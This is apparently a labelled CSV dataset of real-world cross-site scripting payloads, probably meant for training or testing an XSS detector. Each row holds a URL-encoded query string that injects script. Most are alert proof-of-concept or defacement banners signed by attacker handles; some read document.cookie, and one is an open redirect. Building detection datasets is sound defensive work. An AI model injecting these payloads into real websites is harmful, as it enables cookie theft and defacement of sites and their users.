Payload,Label
id=%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cma<br/>rquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
strCountry=%27%22%3E%3C/title%3E%3C<br/>script%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E&strA<br/>ddress=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLI<br/>TOL%3C%2Fh1%3E%3C%2Fmarquee%3E&strMerged=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%<br/>3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&x=38&y=14&ie=UTF-8,1
id=villarosa-ma&congress=14%27%22%3E%3C/title%3E%3Cscr<br/>ipt%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E,1
word=MA%20JUN&type_=1%27%22%3E%3C/title%3E%3Cscript%3<br/>Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E,1
q=MA+LING%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%281337%2<br/>9%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&sbumit.x=50&sbumit.y=<br/>7&sbumit=%CB%D1%CB%F7%D2%BB%CF%C2,1
st=1&kw=%27%22%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3<br/>E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
USERNAME=borkbork&Password=borkbork&NEXTURL=http://www.owasp.or<br/>g/index.php/Open_redirect?,1
q=%20%3Cscript%3Ealert(%22Hacked%20By%20Fantastik%205'li%22)%3C/s<br/>cript%3E,1
n=46&p=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C<br/>/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E156&sDateFromM=1&sDateFromY=<br/>1970&sDateToM=3&sDateToY=2001&sRating=MA&sTitle=&search.x=1&search.y=1,1
letter=&title=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscrip<br/>t%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
AirportName=&City=%27%22%3E%3C/title%3E%3Cscript%3<br/>Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E&Company=MA&C<br/>ountry=&Flight=&From=&TYP=A&To=&cAction=Search,1
p=records&mode=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%<br/>3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E1&sort=date_enter%20desc&i<br/>d=481&ftext=&find=&fphoto=,1
email=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3<br/>E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
keyword=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(133<br/>7)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
searchtext=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(13<br/>37)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E,1
buscador=%22%3E%3Ch1%3E%3Cmarquee%3Esl4xUz&buscador_pna=&tipo_busqueda=<br/>0&buscador_pnev=&cfg_objeto_aux=buscar&cfg_objeto9_aux=&cfg_parametro_aux=&cfg_pagina_aux=&cfg_pag_f<br/>orm_aux=&cfg_vista_aux=&cfg_p_item_aux=&cfg_sw_aux=1&cfg_sw2_aux=&cfg_modo_aux=&cfg_modo2_aux=&cfg_t<br/>ipo_accion_aux=&cfg_accion_aux=&cfg_buscar_aux=&cfg_orden_aux=&cfg_ruta_aux=,1
query=%3Cscript%3Ealert(%22Hacked%20By%20Fantastik%205'li%22)%3<br/>C/script%3E,1
sitesearchInput=%3Cscript%3Ealert(%27xssed%27)%3C/script%3E&s<br/>itesearchSection=all&x=12&y=10,1
ID=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337<br/>)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
get_username=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1337)%<br/>3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&get_password=%27%22%3E%<br/>3C%2Ftitle%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C<br/>%2Fmarquee%3E&referer=%2Findex.php%3F&login=Login,1
qt=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironz<br/>org%3C%2Fh1%3E%3C%2Fmarquee%3E&hpg1=sb&search=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg%3C%2Fh1<br/>%3E%3C%2Fmarquee%3E,1
ID=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/<br/>script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
url=%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3<br/>C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%%27%22%3E%3C/title%3E%3Csc<br/>ript%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E2Fua%2F<br/>search%2F&words=+%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%2<br/>0BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%CF%EE%F8%F3%EA+%EF%EE+%F1%E0%E9%F2%F3%27%22%3E%3C%2Ftitle%3E%3C<br/>script%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3<br/>E,1
"action=cherchons&language=&pays=&type=DESCRIPTION&start=0&<br/>category=&toSearch='""><script>alert(1337)<%2Fscript><marquee>""><h1>SS+BY+XYLITOL<%2Fh1><%2Fmarque>&c<br/>herchons.x=17&cherchons.y=7",1
space=1%27;%20alert(%22mygot_manoel%20was%20here%2<br/>2)%3C/script%3E,1
query=concours+maroc+2008%27%22%3E%3C%2Ftitle%3E%3Cscript%3Eale<br/>rt(1337)%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&category=20&se<br/>arch=1,1
fileurl=http://xssed.com,1
s=%22%3Cscript%3Ealert(1337);%3C/script%3E,1
rubs=search&words=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%2<br/>81337%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+XYLITOL%3C%2Fh1%3E%3C%2Fmarquee%3E&x=12&y=12,1
"orig=""><h1><BR>XSS%20FLAW</h1><comment>",1
artist=&title=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURIT,1
searWords=%22%3E%27%3E%3CscRipT%3Ealert(123)%3C%2FscRipT%<br/>3E&Send=Search&search=0&match=0,1
target=javascript:alert(%22C1c4Tr1Z%22)%27/onmo<br/>useover=alert(%22C1c4Tr1Z%22);foo=%27,1
txtsearch=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20i<br/>ronzorg%3C/h1%3E%3C/marquee%3E,1
query=%3Cscript%3Ealert%28%22Hacked+By+Fantastik+5%27li%22%29%3C%2<br/>Fscript%3E,1
request_type=un_createid&ssobrand=&ssolang=en_US&REALMOI<br/>D=06-3dcadafa-92e6-0028-0000-151f0000151f&SSOURL=%22%0B+onmouseover=alert(/XSS/)+foo=%22&VALUE=abc,1
crid=4f0a964d296af27b&query=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY%20IN<br/>TERNET%20SECURITY%20BY%20CHEROKEE%20WARRIOR%3C/h1%3E%3C/marquee%3E&slice_title=&page=1,1
scope=All+Sites&TMKeyword=%3Cscript%3Ealer<br/>t(%27This+website+is+vulnerable+to+xssing!%27)%3B%3C%2Fscript%3E%0D%0A,1
txtsearch=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzor<br/>g%3C%2Fh1%3E%3C%2Fmarquee%3E&x=0&y=0,1
ArticleID=5&ModuleID=6&Keywords=%22%27%3Cscript%3<br/>Ealert(%27This+website+is+vulnerable+to+xssing!%27)%3B%3C%2Fscript%3E%0D%0A,1
r=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E%3<br/>Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E,1
acc=%3Cimg%20src=http://img185.imageshack.us/img185/7156/<br/>indexbx2.png%3E,1
"version=7.0.8007&os_ver=%22%3E%3Cscript%3Ealert(String.from<br/>CharCode(107,%2073,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%20115,%2032,%20105,%2083,%2032<br/>,%20100,%2065,%2032,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099,%2075,%2032,%2084,%20104,%201<br/>01,%2032,%2082,%20101,%20115,%2084,%2033,%2033,%2033));%3C/script%3E%3C!--%22%3E%3Cscript%3Ealert(St<br/>ring.fromCharCode(107,%2073,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%20115,%2032,%20105,%2<br/>083,%2032,%20100,%2065,%2032,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099,%2075,%2032,%2084,%2<br/>0104,%20101,%2032,%2082,%20101,%20115,%2084,%2033,%2033,%2033));%3C/script%3E%3C!--",1
select_subweb=0&cx=008464509538490152239%3Arofkqjk<br/>6lvq&cof=FORID%3A11&q=%22%3E%3Cscript%3Ealert(%27XSS+by+PHPLizardo%27)%3C%2Fscript%3E&sa=Chercher,1
vgnextoid=4a38<br/>272cb3eae010VgnVCM1000008055a8c0RCRD&vgnextchannel=4a38272cb3eae010VgnVCM1000008055a8c0RCRD&as_q=%3E<br/>%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURITY+BY+CHEROKEE+WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E,1
"metyus=cat&cid=49&label=""><script>alert(""Mor-DunyA"")</script>",1
group=php.announce+%22%3E%3Ch1%3EXSS%3C/h1%3E,1
type=PAC&restrict=ALL&strict=&word=%3Cscript%3Ealert(%27xssed%2<br/>7)%3C/script%3E,1
path=systran/systranFR&lang=%27%22%3E%3C/title%3E%3Cscript<br/>%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E%27%22%3<br/>E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E<br/>%3C/marquee%3E&urlmode=window,1
action=details&cat=%3Cscript%3Ealert(1)%3C/script%3E&id=1,1
palBuscar=%3Cmarquee%3E%3Ch1%3Efuck%20u%20chavez%<br/>3C/h1%3E%3Cbr/%3EXSSed!,1
page=1&sortfield=%3C%3C%3C%3C%3C%3E%3C%3C%3E%3C%22%3C%3C%<br/>3E%3C%3E%3E%3C%22%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E&sortorder=asc,1
page=1&ausername=%3C%3C%3C%3C%3C%3E%3C%3C%3E%3C%22%3C%3C%3E%3C%<br/>3E%3E%3C%22%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E,1
cat=%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E,1
SearchType=4&UCSB%3aTextBoxWho=%22%3E%3C/script%3E%3Cscript%3Ealert(<br/>123)%3C/script%3E&UCSB%3aTextBoxWhere=Uber0n,1
page=1&ausername=%3C%3C%3C%3C%3C%3E%3C%3C%3E%3C%22%3C%3C%3<br/>E%3C%3E%3E%3C%22%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E,1
BUSCADOR=algo%22%2F%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E,1
page=1&sortfield=%3C%3C%3C%3C%3C%3E%3C%3C%3E%3C<br/>%22%3C%3C%3E%3C%3E%3E%3C%22%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E&sortorder=asc,1
rch=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cma<br/>rquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarq&loc=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscr<br/>ipt%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C&submit.x=0&submit.y=0,1
type_annonce=EMP&MOTCLE=%3Cscript%3Ealert%28%2FZ<br/>eryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&submit2.x=6<br/>&submit2.y=9,1
Subject_index1=<script>alert(docum<br/>ent.cookie)</script>&Sub_index=Prejudice,1
"mapid=NorthAmerica&lang=en&design=default&fname=Jenni&sn<br/>ame=S.+PHILADELPHIA%2C+PA&svv=true&snum=1849&zipid=19148&place=19147&addr=&city='""><script>alert('xs<br/>s');</script>&region=&zip=&storeNum=&mapx=&mapy=&easy.x=0&easy.y=0",1
page=1&ausername=%3C%3C%3C%3C%3C%3E%3C%3C%3E%3C%22%3C%3C%3E<br/>%3C%3E%3E%3C%22%3CsCrIpT%3Ealert(document.cookie)%3C/sCrIpT%3E,1
picklang=%2Findex.cgi%3Flang%3DEN%26clickflag%3D1%26&field=ARTIST+O<br/>R+TITLE&wild=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURITY+BY+CHEROKEE+WARRIOR%3C%2Fh1%3E%3C%2Fma<br/>rquee%3E&Go!.x=0&Go!.y=0&Go!=Search,1
term=%3Cscript%3Ealert%28%2FZeryus%2F%29%3C%2Fscript%3E%3Cmarquee%3E<br/>%3Ch1%3EXSS+by+Zeryus+%3C%2Fh1%3E%3C%2Fmarquee%3E&search.x=14&search.y=9&wpage=recherche,1
id='%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)<br/>%3C/sCrIpT%3E,1
query=%27%22%3Cscript%3Ealert(%27This%2<br/>0website%20is%20vulnerable%20to%20xssing!%27)%3B%3C/script%3E&submit.x=31&submit.y=10&submit=Search,1
Secteur=&Region=&Mots=+%3Cscript%3Ealert%28%2FZeryus%2F%29<br/>%3C%2Fscript%3E%3Cmarque&image.x=0&image.y=0,1
